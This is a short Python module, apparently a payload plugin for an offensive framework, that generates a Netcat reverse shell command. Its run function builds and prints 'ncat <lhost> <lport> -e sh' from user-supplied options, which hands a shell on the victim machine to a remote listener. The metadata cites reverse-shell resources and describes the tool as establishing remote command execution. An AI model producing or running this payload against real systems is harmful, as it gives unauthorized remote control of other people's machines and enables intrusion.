#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata for a Netcat-based reverse shell tool
metadata = {
    "name": "NetcatShell Reverse Shell",
    "description": "A simple Netcat-based reverse shell that establishes a remote command execution session.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address for the reverse shell connection",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "Listening port on the target host for incoming connections",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for transmitted commands",
            "required": False,
            "default": "utf-8",
        },
    },
}


class Encoder:
    pass


def run(args):
    """Execute the Netcat reverse shell command based on provided arguments"""
    lhost = args.get("lhost", metadata["options"]["lhost"]["default"])
    lport = args.get("lport", metadata["options"]["lport"]["default"])
    encode = args.get("encode", metadata["options"]["encode"]["default"])

    # Generate the Netcat reverse shell command
    netcat_command = f"ncat {lhost} {lport} -e sh"
    print(netcat_command)
